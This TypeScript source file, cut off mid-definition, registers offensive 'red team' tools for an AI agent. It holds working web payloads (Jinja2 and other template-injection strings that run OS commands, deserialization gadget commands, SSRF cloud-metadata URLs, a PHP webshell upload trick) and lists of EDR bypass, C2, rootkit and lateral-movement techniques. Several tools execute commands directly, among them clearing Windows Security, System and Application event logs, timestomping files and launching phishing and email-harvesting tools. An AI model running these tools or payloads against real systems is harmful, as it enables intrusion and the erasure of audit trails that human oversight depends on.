import {
	type AgentTool,
	createTool,
	validateWithZod,
	zodToJsonSchema,
} from "@cline/shared";
import { z } from "zod";
import { type RedTeamRuntimeEnv, rtState } from "./shared";

export function registerAdvancedReTools(env: RedTeamRuntimeEnv): void {
	const { tools } = env;

	// --- Advanced exploit techniques ---

	const ExploitChainSchema = z.object({
		vulns: z.array(z.string().min(1)).min(1),
		target: z.string().min(1),
	});
	tools.push(
		createTool<
			{ vulns: string[]; target: string },
			{ chain: string[]; command: string }
		>({
			name: "rt_ref_exploit_chain",
			description: "Chain multiple vulnerabilities into an attack sequence.",
			inputSchema: zodToJsonSchema(ExploitChainSchema),
			execute: async (input) => {
				const v = validateWithZod(ExploitChainSchema, input);
				const chain = v.vulns.map(
					(vuln, i) => `Step ${i + 1}: exploit ${vuln} on ${v.target}`,
				);
				return {
					chain,
					command: `# Exploit chain for ${v.target}\n${chain.join("\n")}`,
				};
			},
		}) as AgentTool,
	);

	const FuzzSchema = z.object({
		target: z.string().min(1),
		mode: z.enum(["afl", "libfuzzer", "radamsa"]).optional(),
	});
	tools.push(
		createTool<{ target: string; mode?: string }, { command: string }>({
			name: "rt_ref_fuzz",
			description: "Generate fuzzing command.",
			inputSchema: zodToJsonSchema(FuzzSchema),
			execute: async (input) => {
				const v = validateWithZod(FuzzSchema, input);
				const mode = v.mode ?? "afl";
				const cmds: Record<string, string> = {
					afl: `afl-fuzz -i input/ -o output/ -m none -- ${v.target} @@`,
					libfuzzer: `${v.target} -max_len=4096 -dict=dict.txt corpus/`,
					radamsa: `radamsa -o output.txt -n 1000 input.txt`,
				};
				return { command: cmds[mode] };
			},
		}) as AgentTool,
	);

	const DeserSchema = z.object({
		type: z.enum(["java", "php", "python", "dotnet"]).optional(),
		gadget: z.string().optional(),
	});
	tools.push(
		createTool<{ type?: string; gadget?: string }, { commands: string[] }>({
			name: "rt_ref_deser",
			description: "Generate deserialization exploit commands.",
			inputSchema: zodToJsonSchema(DeserSchema),
			execute: async (input) => {
				const v = validateWithZod(DeserSchema, input);
				const t = v.type ?? "java";
				const cmds: Record<string, string[]> = {
					java: [
						"java -jar ysoserial.jar CommonsCollections6 'cmd' | base64",
						"java -jar ysoserial.jar URLDNS 'http://callback'",
					],
					php: [
						"phpggc Laravel/RCE1 system id",
						"phpggc Symfony/RCE4 exec 'id'",
					],
					python: [
						"python3 -c \"import pickle,os; pickle.dumps(os.system('id'))\"",
					],
					dotnet: [".NET deserialization via ysoserial.net"],
				};
				return { commands: cmds[t] };
			},
		}) as AgentTool,
	);

	const SstiSchema = z.object({
		engine: z
			.enum(["jinja2", "twig", "freemarker", "velocity", "smarty"])
			.optional(),
	});
	tools.push(
		createTool<{ engine?: string }, { payloads: string[] }>({
			name: "rt_ref_ssti",
			description: "Generate SSTI payloads by template engine.",
			inputSchema: zodToJsonSchema(SstiSchema),
			execute: async (input) => {
				const v = validateWithZod(SstiSchema, input);
				const e = v.engine ?? "jinja2";
				const payloads: Record<string, string[]> = {
					jinja2: [
						"{{7*7}}",
						"{{config}}",
						"{{''.__class__.__mro__[1].__subclasses__()}}",
						"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
					],
					twig: [
						"{{7*7}}",
						"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
					],
					freemarker: [
						"$" + "{7*7}",
						'<#assign ex="freemarker.template.utility.Execute"?new()>' +
							"$" +
							'{ex("id")}',
					],
					velocity: [
						"#set($x=7*7)$x",
						"#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))",
					],
					smarty: ["{7*7}", "{php}echo `id`;{/php}"],
				};
				return { payloads: payloads[e] };
			},
		}) as AgentTool,
	);

	const SsrfBypassSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<{ target: string }, { payloads: string[] }>({
			name: "rt_ref_ssrf_bypass",
			description: "Generate SSRF bypass payloads.",
			inputSchema: zodToJsonSchema(SsrfBypassSchema),
			execute: async () => {
				return {
					payloads: [
						"http://127.0.0.1",
						"http://localhost",
						"http://0.0.0.0",
						"http://[::1]",
						"http://127.1",
						"http://2130706433",
						"http://0x7f000001",
						"http://127.0.0.1.nip.io",
						"http://169.254.169.254/latest/meta-data/",
						"http://metadata.google.internal/computeMetadata/v1/",
						"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
					],
				};
			},
		}) as AgentTool,
	);

	const UploadBypassSchema = z.object({ filename: z.string().optional() });
	tools.push(
		createTool<{ filename?: string }, { techniques: string[] }>({
			name: "rt_ref_upload_bypass",
			description: "Generate file upload bypass techniques.",
			inputSchema: zodToJsonSchema(UploadBypassSchema),
			execute: async () => {
				return {
					techniques: [
						"Double extension: shell.php.jpg",
						"Null byte: shell.php%00.jpg",
						"Case variation: shell.PHP, shell.PhP",
						"Trailing dot: shell.php.",
						"Trailing space: shell.php ",
						"Content-Type spoof: image/jpeg with PHP content",
						"Magic bytes: GIF89a<?php system($_GET['c']); ?>",
						"Polyglot: valid image + embedded PHP",
						"HTAccess upload: .htaccess with AddType application/x-httpd-php .jpg",
						"Race condition: upload + access simultaneously",
					],
				};
			},
		}) as AgentTool,
	);

	const RaceSchema = z.object({
		url: z.string().min(1),
		requests: z.number().int().optional(),
	});
	tools.push(
		createTool<{ url: string; requests?: number }, { command: string }>({
			name: "rt_ref_race",
			description: "Generate race condition attack command.",
			inputSchema: zodToJsonSchema(RaceSchema),
			execute: async (input) => {
				const v = validateWithZod(RaceSchema, input);
				const n = v.requests ?? 20;
				return {
					command: `# Turbo Intruder single-packet attack\n# Send ${n} requests in single packet to ${v.url}`,
				};
			},
		}) as AgentTool,
	);

	const SmuggleSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<{ target: string }, { payloads: string[] }>({
			name: "rt_ref_smuggle",
			description: "Generate HTTP request smuggling payloads.",
			inputSchema: zodToJsonSchema(SmuggleSchema),
			execute: async () => {
				return {
					payloads: [
						"CL.TE: Content-Length + Transfer-Encoding: chunked",
						"TE.CL: Transfer-Encoding + Content-Length",
						"TE.TE: dual Transfer-Encoding with obfuscation",
						"HTTP/2 smuggling: pseudo-header injection",
					],
				};
			},
		}) as AgentTool,
	);

	const CachePoisonSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<{ target: string }, { techniques: string[] }>({
			name: "rt_ref_cache_poison",
			description: "Generate web cache poisoning/deception techniques.",
			inputSchema: zodToJsonSchema(CachePoisonSchema),
			execute: async () => {
				return {
					techniques: [
						"Unkeyed header: X-Forwarded-Host",
						"Unkeyed header: X-Original-URL",
						"Unkeyed parameter: ?callback=",
						"Fat GET: body in GET request",
						"Cache deception: /profile/nonexistent.css",
						"Cache key normalization bypass",
					],
				};
			},
		}) as AgentTool,
	);

	const ProtoPolluteSchema = z.object({ target: z.string().min(1) });
	tools.push(
		createTool<{ target: string }, { payloads: string[] }>({
			name: "rt_ref_proto_pollute",
			description: "Generate prototype pollution payloads.",
			inputSchema: zodToJsonSchema(ProtoPolluteSchema),
			execute: async () => {
				return {
					payloads: [
						'{"__proto__":{"isAdmin":true}}',
						'{"constructor":{"prototype":{"isAdmin":true}}}',
						"?__proto__[isAdmin]=true",
						"?constructor[prototype][isAdmin]=true",
					],
				};
			},
		}) as AgentTool,
	);

	const GraphqlAttackSchema = z.object({ url: z.string().min(1) });
	tools.push(
		createTool<{ url: string }, { attacks: string[] }>({
			name: "rt_ref_graphql_attack",
			description: "Generate GraphQL attack payloads.",
			inputSchema: zodToJsonSchema(GraphqlAttackSchema),
			execute: async () => {
				return {
					attacks: [
						"Introspection: { __schema { types { name } } }",
						"Depth attack: nested query 10+ levels",
						"Batching: array of queries",
						"Alias abuse: multiple aliases for same field",
						"Field suggestion: typo to get suggestions",
						"Mutation abuse: unauthorized mutations",
					],
				};
			},
		}) as AgentTool,
	);

	const WsSchema = z.object({ url: z.string().min(1) });
	tools.push(
		createTool<{ url: string }, { attacks: string[] }>({
			name: "rt_ref_websocket",
			description: "Generate WebSocket attack payloads.",
			inputSchema: zodToJsonSchema(WsSchema),
			execute: async () => {
				return {
					attacks: [
						"CSWSH: cross-site WebSocket hijacking",
						"Message injection",
						"Authentication bypass (no token check)",
						"Message flooding (DoS)",
						"Origin validation bypass",
					],
				};
			},
		}) as AgentTool,
	);

	// --- AD / Cloud / Container advanced ---
	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_ad_attack",
			description: "Generate Active Directory attack commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"BloodHound: SharpHound.exe -c All",
						"Kerberoast: impacket-GetUserSPNs -request",
						"AS-REP: impacket-GetNPUsers",
						"DCSync: impacket-secretsdump -just-dc",
						"ADCS: certipy find -vulnerable",
						"Delegation: impacket-findDelegation",
						"ACL: bloodyAD get object ...",
						"Shadow creds: pywhisker --add",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_cloud_attack",
			description: "Generate cloud attack commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"AWS: pacu, cloudfox, prowler",
						"Azure: azurehound, roadtools, aadinternals",
						"GCP: gcpbucketbrute, forseti",
						"IAM privesc: enumerate permissions, find escalation paths",
						"Metadata SSRF: 169.254.169.254",
						"Bucket takeover: S3, Azure Blob, GCS",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_container_advanced",
			description: "Generate advanced container escape commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"docker.sock abuse: docker run -v /:/host alpine chroot /host",
						"privileged: capsh --print, mount host fs",
						"cgroup escape: CVE-2022-0492",
						"k8s: service account token, secrets, etcd",
						"containerd: shim exploit",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Evasion advanced ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_edr_bypass",
			description: "Generate EDR bypass techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Unhooking: restore ntdll from disk",
						"Direct syscalls: syscall instruction",
						"Indirect syscalls: jump to syscall in ntdll",
						"Hell's Gate / Halo's Gate",
						"Tartarus Gate",
						"Module stomping",
						"Process hollowing",
						"PPID spoofing",
						"Token manipulation",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_amsi_bypass",
			description: "Generate AMSI bypass techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Memory patching: amsi.dll AmsiScanBuffer",
						"Reflection: System.Management.Automation.AmsiUtils",
						"Obfuscation: string concatenation, base64",
						"COM hijacking",
						"PowerShell downgrade (v2)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_anti_debug",
			description: "Generate anti-debug techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"IsDebuggerPresent",
						"NtQueryInformationProcess (DebugPort)",
						"CheckRemoteDebuggerPresent",
						"Timing checks (rdtsc, GetTickCount)",
						"PEB.BeingDebugged",
						"NtSetInformationThread (HideFromDebugger)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_anti_vm",
			description: "Generate anti-VM techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Registry: HKLM\\SOFTWARE\\VMware",
						"Files: VMware Tools, VirtualBox Guest Additions",
						"MAC: 00:0C:29, 00:50:56, 08:00:27",
						"CPUID: hypervisor bit",
						"Processes: vmtoolsd, vboxservice",
						"Services: VMware, VirtualBox",
					],
				};
			},
		}) as AgentTool,
	);

	// --- C2 advanced ---
	tools.push(
		createTool<Record<string, never>, { protocols: string[] }>({
			name: "rt_ref_c2_advanced",
			description: "Generate advanced C2 protocols and techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					protocols: [
						"HTTP/HTTPS with malleable profiles",
						"DNS (A, AAAA, TXT, CNAME)",
						"SMB (named pipes)",
						"TCP (raw)",
						"ICMP (covert channel)",
						"WebSocket",
						"gRPC",
						"Slack/Discord (living off trusted services)",
						"Dead drop resolvers (pastebin, github)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { stagers: string[] }>({
			name: "rt_ref_stager",
			description: "Generate stager types.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					stagers: [
						"PowerShell (IEX, download cradle)",
						"VBS (mshta, wscript)",
						"HTA (mshta)",
						"Macro (VBA, XLM)",
						"ISO (LNK, DLL sideloading)",
						"LNK (shortcut)",
						"OneNote (embedded files)",
						"MSI (custom action)",
						"ClickOnce (application manifest)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_inmem_exec",
			description: "Generate in-memory execution techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Reflective DLL loading",
						"Shellcode injection (VirtualAlloc + CreateThread)",
						".NET assembly loading (Assembly.Load)",
						"PowerShell (Invoke-Expression, IEX)",
						"Python exec()",
						"Node.js eval()",
						"JScript (eval, new Function)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_fileless",
			description: "Generate fileless execution techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Memory-only (no file written)",
						"Registry-resident (payload in registry)",
						"WMI event subscription",
						"Scheduled task with encoded command",
						"PowerShell (no script file)",
						"LOLBins (certutil, bitsadmin, mshta)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_redirector",
			description: "Generate redirector setup commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"nginx: proxy_pass to C2",
						"apache: mod_rewrite + mod_proxy",
						"socat: TCP relay",
						"iptables: NAT redirect",
						"domain fronting: SNI vs Host",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Lateral movement advanced ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_lateral_advanced",
			description: "Generate advanced lateral movement techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"DCOM: MMC20.Application, ShellWindows, ShellBrowserWindow",
						"WMI: Win32_Process.Create, event subscription",
						"PsExec, SMBExec, WMIExec, DCOMExec",
						"WinRM, Evil-WinRM",
						"RDP, RDP hijacking",
						"SSH, SSH tunneling",
						"WinRS, scheduled tasks, services",
						"BITS, COM, UAC bypass",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_dcom",
			description: "Generate DCOM lateral movement techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"MMC20.Application: ExecuteShellCommand",
						"ShellWindows: Document.Application.ShellExecute",
						"ShellBrowserWindow: Document.Application.ShellExecute",
						"Excel.Application: DDE, macro",
						"Outlook.Application: create rule, send email",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_wmi",
			description: "Generate WMI lateral movement techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Win32_Process.Create",
						"WMI event subscription (persistence)",
						"Invoke-WmiMethod",
						"Get-WmiObject",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Persistence advanced ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_persist_advanced",
			description: "Generate advanced persistence techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Registry: Run, RunOnce, Winlogon, IFEO, COM hijacking",
						"Services, scheduled tasks, WMI subscriptions",
						"DLL hijacking, search order hijacking",
						"Bootkits, rootkits, kernel modules",
						"Firmware implants",
						"Webshells (advanced, polymorphic)",
						"SSH authorized_keys",
						"Cron, systemd, init.d",
						"PAM backdoor, LD_PRELOAD",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_rootkit",
			description: "Generate rootkit techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Kernel module (LKM)",
						"LD_PRELOAD",
						"DKOM (Direct Kernel Object Manipulation)",
						"SSDT hooking",
						"IRP hooking",
						"Process hiding",
						"File hiding",
						"Network hiding",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_bootkit",
			description: "Generate bootkit techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"MBR infection",
						"VBR infection",
						"UEFI bootkit",
						"Secure Boot bypass",
						"BlackLotus, Bootkitty",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Anti-forensics advanced ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_antiforensics_advanced",
			description: "Generate advanced anti-forensics techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Timestomping (MFT manipulation)",
						"Log wiping (Windows event logs, Linux logs)",
						"MFT manipulation, USN journal wiping",
						"Prefetch deletion",
						"Shellbag cleaning",
						"Registry cleaning",
						"Memory wiping",
						"Secure deletion (shred, sdelete)",
						"Steganography for data hiding",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_timestomp",
			description: "Execute timestomping command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd =
					"touch -r /etc/passwd /tmp/payload; touch -t 202001010000 /tmp/payload";
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{
				commands: string[];
				results: { cmd: string; code: number; stdout: string }[];
			}
		>({
			name: "rt_log_wipe",
			description: "Execute log wiping commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const commands = [
					"wevtutil cl Security",
					"wevtutil cl System",
					"wevtutil cl Application",
				];
				if (rtState.killed) return { commands, results: [] };
				if (rtState.dryRunMode)
					return {
						commands,
						results: commands.map((c) => ({
							cmd: c,
							code: 0,
							stdout: "[dry-run]",
						})),
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const results: { cmd: string; code: number; stdout: string }[] = [];
				for (const cmd of commands) {
					try {
						const { stdout } = await run(cmd, {
							timeout: 60000,
							maxBuffer: 10 * 1024 * 1024,
						});
						results.push({ cmd, code: 0, stdout: stdout.slice(0, 10000) });
					} catch (e: unknown) {
						const err = e as { stdout?: string; code?: number };
						results.push({
							cmd,
							code: err.code ?? 1,
							stdout: (err.stdout ?? "").slice(0, 10000),
						});
					}
				}
				return { commands, results };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_stego",
			description: "Execute steganography command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "steghide embed -cf image.jpg -ef secret.txt -p password";
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- OSINT advanced ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_osint",
			description: "Generate OSINT techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Social media: LinkedIn, Twitter, Facebook",
						"Breach DBs: HIBP, DeHashed, LeakCheck",
						"Paste sites: Pastebin, GitHub Gists",
						"Dark web: forums, marketplaces, leak sites",
						"Code repos: GitHub, GitLab, Bitbucket",
						"Document metadata: EXIF, PDF metadata",
						"Email: Hunter.io, email validation",
						"Phone: reverse lookup",
						"Domain: WHOIS, DNS history, cert history",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_breach_db",
			description: "Execute breach DB lookup command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd =
					"curl -s 'https://api.xposedornot.com/v1/check-email/user@example.com'";
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_darkweb",
			description: "Generate dark web monitoring commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"Tor: torsocks curl http://hidden.onion",
						"Monitoring: check leak sites, forums, marketplaces",
						"Tools: spiderfoot, maltego, shodan",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_metadata",
			description: "Execute metadata extraction command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "exiftool document.pdf";
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_email_harvest",
			description: "Execute email harvesting command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "theHarvester -d example.com -b google,bing,linkedin";
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 300000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Exploit development ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_exploit_dev",
			description: "Generate exploit development techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Buffer overflow: stack/heap",
						"ROP chains",
						"Use-after-free",
						"Double free",
						"Format string",
						"Integer overflow",
						"Race condition (TOCTOU)",
						"Deserialization",
						"Template injection",
						"Command injection",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_ref_bof",
			description: "Execute buffer overflow exploit template.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "python3 -c \"print('A'*offset + p64(ret_addr))\"";
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_ref_rop",
			description: "Execute ROP chain command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "ROPgadget --binary ./binary --ropchain";
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Malware ---
	tools.push(
		createTool<Record<string, never>, { types: string[] }>({
			name: "rt_ref_malware",
			description: "Generate malware types.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					types: [
						"Trojan, backdoor, RAT",
						"Keylogger, stealer",
						"Ransomware",
						"Worm, virus",
						"Bootkit, rootkit",
						"Packer, crypter",
						"Loader, dropper",
						"C2 framework",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Social engineering ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_soceng",
			description: "Generate social engineering techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Phishing (spearphishing, whaling)",
						"Vishing, smishing",
						"Pretexting",
						"OSINT-driven targeting",
						"Credential harvesting",
						"MFA bypass (Evilginx, Modlishka)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_phishing",
			description: "Execute phishing setup.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "gophish";
				if (rtState.killed) return { command: cmd, stdout: "killed", code: -1 };
				if (rtState.dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Physical ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_physical",
			description: "Generate physical security techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Lock picking, RFID cloning",
						"Badge cloning, tailgating",
						"Rogue device deployment",
						"USB attacks (Rubber Ducky, Bash Bunny)",
					],
				};
			},
		}) as AgentTool,
	);

	// --- ICS/OT ---
	tools.push(
		createTool<Record<string, never>, { protocols: string[] }>({
			name: "rt_ref_ics",
			description: "Generate ICS/OT attack techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					protocols: [
						"Modbus, DNP3, S7comm, OPC UA",
						"SCADA, HMI, PLC",
						"Industrial protocols",
						"Safety systems",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Mobile ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_mobile",
			description: "Generate mobile attack techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
